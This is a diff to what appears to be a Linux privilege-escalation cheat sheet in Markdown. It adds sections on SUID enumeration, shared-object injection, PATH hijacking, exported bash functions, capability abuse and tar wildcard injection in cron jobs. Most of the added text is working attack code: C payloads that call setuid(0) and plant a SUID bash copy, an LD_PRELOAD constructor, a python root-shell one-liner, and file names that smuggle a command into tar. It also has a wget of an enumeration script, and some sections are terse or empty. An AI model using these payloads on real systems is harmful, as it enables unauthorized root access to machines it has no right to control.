@@ -162,7 +162,7 @@ Firstly we create source code file for a shared object.
 
 {% code title="shell.c" %}
 ```c
-#inclu-de <stdio.h>
+#include <stdio.h>
 #include <stdlib.h>
 #include <sys/types.h>
 
@@ -170,7 +170,7 @@ void _init(){
     unsetenv("LD_PRELOAD");
     setgid(0);
     setuid(0);
-    system("/bin/bash"); // "cp /bin/bash /tmp/yzbash; chmod +s /tmp/yzbash"
+    system("cp /bin/bash /tmp/yz && chmod +s /tmp/yz && /tmp/yz -p");
 }
 ```
 {% endcode %}
@@ -221,37 +221,181 @@ gcc -o exploit exploit.c
 ./exploit
 ```
 
-## Cron jobs
-
-Crons are located in:
-
-```text
-/var/spool/cron/
-/var/spool/cron/crontabs/
-/etc/crantab
-```
-
-The crontab PATH environment variable is by default set to `/usr/bin:/bin`
-
 ## SUID / SGID files
 
+You can list SUID executable with this command.
+
 ```text
-find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \;2> /dev/null
-find / -user <user> -perm -4000 -exec ls -ldb {} \; 2>/dev/null
+find / -perm -4000 -type f -exec ls --color=auto -l {} \;2>/dev/null
+```
+
+Check for easy wins: [https://gtfobins.github.io/](https://gtfobins.github.io/)
+
+This script is great: [https://github.com/Anon-Exploiter/SUID3NUM](https://github.com/Anon-Exploiter/SUID3NUM)
+
+```text
+wget https://raw.githubusercontent.com/Anon-Exploiter/SUID3NUM/master/suid3num.py
 ```
 
 ```text
-https://github.com/Anon-Exploiter/SUID3NUM
+
 ```
 
 ```text
-# Running strings against a file:
-strings <file>
 
+```
+
+```text
+
+```
+
+```text
 # Running strace against a command:
 strace -v -f -e execve <command> 2>&1 | grep exec
 
 # Running ltrace against a command:
 ltrace <command>
+```
+
+### Shared object injection
+
+Sometimes executables use third party shared objects, which we are able to hijack and run our malicious code, with permissions of original executable.
+
+You can run `strings` on SUID executables, then look for shared object paths.
+
+Also `strace` can show objects used by the executable.
+
+```text
+strace <executable> 2>&1
+strace <executable> 2>&1 | grep -i -E "open|access|no such file"
+```
+
+{% code title="shared\_object.c" %}
+```c
+#include <stdio.h>
+#include <stdlib.h>
+
+static void inject() __attribute__((constructor));
+
+void inject(){
+    system("cp /bin/bash /tmp/yz && chmod +s /tmp/yz && /tmp/yz -p");
+}
+```
+{% endcode %}
+
+Compile shared object with gcc.
+
+```text
+gcc -shared -fPIC -o <output> shared_object.c
+```
+
+### Binary simlinks
+
+[https://packetstormsecurity.com/files/139750/Nginx-Root-Privilege-Escalation.html](https://packetstormsecurity.com/files/139750/Nginx-Root-Privilege-Escalation.html)
+
+### Enviromental variables \(PATH\)
+
+Find anything related to enviromental variables\(PATH, etc...\)
+
+```text
+strings <executable>
+```
+
+When you find executable called without full path, create your own with same name.
+
+{% code title="executable.c" %}
+```c
+void main(){
+    setgid(0);
+    setuid(0);
+    system("cp /bin/bash /tmp/yz && chmod +s /tmp/yz && /tmp/yz -p");
+}
+```
+{% endcode %}
+
+Then compile it.
+
+```text
+gcc executable.c -o executable
+```
+
+And change path to your working directory.
+
+```text
+export PATH=/tmp:$PATH
+```
+
+### Malicious bash functions
+
+Find out if executable runs any bash commands.
+
+```text
+strings <executable>
+```
+
+When you find one, create a bash function.
+
+```text
+function /command/you/found() {cp /bin/bash /tmp/yz && chmod +s /tmp/yz && /tmp/yz -p}
+export -f /command/you/found
+```
+
+Again run original executable. But now it will run your bash function instead of original command.
+
+## Capabilities
+
+Kernel 2.2 and higher.
+
+```text
+getcap -r / 2>/dev/null
+```
+
+You are looking for `+ep` , like this.
+
+```text
+/usr/bin/python2.6 = cap_setuid+ep
+```
+
+And then: [https://gtfobins.github.io/\#+capabilities](https://gtfobins.github.io/#+capabilities)
+
+```text
+/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+```
+
+## Cron jobs
+
+Crons can be enumerated with:
+
+```text
+cat /etc/crontab
+```
+
+Also located in these directories.
+
+```text
+/var/spool/cron/
+/var/spool/cron/crontabs/
+```
+
+The crontab PATH environment variable is by default set to `/usr/bin:/bin`
+
+### Cron paths
+
+PATH + relative path = win
+
+### Wildcards \(\*\)
+
+When.
+
+```text
+cd /home/user
+tar czf /tmp/backup.tar.gz *
+```
+
+Then you can. 
+
+```text
+touch /home/user/--checkpoint=1
+touch /home/user/--checkpoint-action=exec=sh\malicious.sh
 ```
 
